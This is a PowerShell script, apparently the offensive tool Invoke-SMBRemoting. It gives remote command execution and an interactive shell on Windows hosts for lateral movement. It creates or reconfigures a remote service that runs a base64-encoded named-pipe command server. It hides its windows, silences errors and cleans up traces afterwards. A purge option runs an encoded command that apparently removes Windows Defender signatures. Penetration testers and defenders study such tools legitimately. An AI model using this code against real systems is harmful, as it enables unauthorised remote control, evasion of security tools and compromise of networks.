function Invoke-SMBRemoting {
	
	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting

	.DESCRIPTION
	Interactive Shell and Command Execution over Named-Pipes (SMB) for Fileless lateral movement.

 	.REQUIREMENTS
	Admin rights over the target Host
	
	.PARAMETER ComputerName
	The Server HostName or IP to connect to
	
	.PARAMETER PipeName
	Specify the Pipe Name
	
	.PARAMETER ServiceName
	Specify the Service Name
	
	.PARAMETER Command
	Specify a command to run instead of getting a Shell
	
	.PARAMETER Timeout
	Specify a Timeout after which the script will stop waiting for a connection
	
	.PARAMETER ModifyService
	Modify an existing service instead of creating a new one. If no target service is specified SensorService is targeted
	
	.PARAMETER Verbose
	Show Pipe and Service Name info
	
	.EXAMPLE
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Command "whoami /all"
	
	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "30000",
		[switch]$ModifyService,
		[switch]$Purge,
		[switch]$Verbose
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName -AND !$ModifyService){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	elseif(!$ServiceName -AND $ModifyService){
		$ServiceName = "SensorService"
	}
	
	if($Purge){
		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
	
		$startarguments = "\\$ComputerName start $ServiceName"
		
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Write-Output "[+] Done!"
		
		break
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$tcb={param(`$state);`$state.Close()};
`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
`$pipeServer.WaitForConnection()
`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
`$tm.Dispose();
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	if($ModifyService){
		
		$originalBinPath = & sc.exe \\$ComputerName qc $ServiceName | Select-String "BINARY_PATH_NAME" | ForEach-Object {$_.ToString().Split(":", 2)[1].Trim()}
		
		$arguments = "\\$ComputerName config $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
		
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
		# Optional: Restart the service to apply the changes
		$stopArguments = "\\$ComputerName stop $ServiceName"
		$startArguments = "\\$ComputerName start $ServiceName"
		
		# Stop the service
		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	}
	
	else{
		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
		$startarguments = "\\$ComputerName start $ServiceName"
		
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
		Start-Sleep -Milliseconds 1000
		
		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	}
	
	if($Verbose){
		if($ModifyService){
			Write-Output ""
			Write-Output " [+] Pipe Name: $PipeName"
			Write-Output " [+] Service Name: $ServiceName"
			Write-Output " [+] Original binPath: $originalBinPath"
			Write-Output " [+] Modifying Service on Remote Target..."
			Write-Output ""
		}
		else{
			Write-Output ""
			Write-Output " [+] Pipe Name: $PipeName"
			Write-Output " [+] Service Name: $ServiceName"
			Write-Output " [+] Creating Service on Remote Target..."
			Write-Output ""
		}
	}
	
	# Get the current process ID
	$currentPID = $PID
	
	if($ModifyService){
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID
`$BinPath = "$originalBinPath"

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, stop the service
		`$stoparguments = "\\`$TargetServer stop `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		`$arguments = "\\`$TargetServer config `$serviceToDelete binpath= `$BinPath"
		Start-Process sc.exe -ArgumentList `$arguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@}
	else{
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@}
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	$MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	if ($Command) {
		$Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
		$Command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
		$fullCommand = "$Command 2>&1 | Out-String"
		$sw.WriteLine($fullCommand)
		$sw.Flush()
		while ($true) {
			$line = $sr.ReadLine()
			if ($line -eq "###END###") {
				Write-Output $serverOutput.Trim()
				Write-Output ""
				break
			} else {
				$serverOutput += "$line`n"
			}
		}
	} 
	
	else {
		while ($true) {
			
			# Fetch the actual remote prompt
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			$remotePath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					# Remove any extraneous whitespace, newlines etc.
					$remotePath = $remotePath.Trim()
					break
				} else {
					$remotePath += "$line`n"
				}
			}
			$ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
   			if($ComputerName -match $ipPattern){$computerNameOnly = $ComputerName}
      			else{$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1}
			$promptString = "[$computerNameOnly]: $remotePath "
			Write-Host -NoNewline $promptString
			$userCommand = Read-Host
			
			if ($userCommand -eq "exit") {
				Write-Output ""
					$sw.WriteLine("exit")
				$sw.Flush()
				break
			}
			
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand 2>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
			
			else{
				continue
			}

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
				}
			}
		}
	}
	if($ModifyService){
		$stopArguments = "\\$ComputerName stop $ServiceName"
		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
		$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
		
	}
	else{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
	}
	
	$pipeClient.Close()
	$pipeClient.Dispose()
	Stop-Process -Id $MonitoringProcess.Id
}
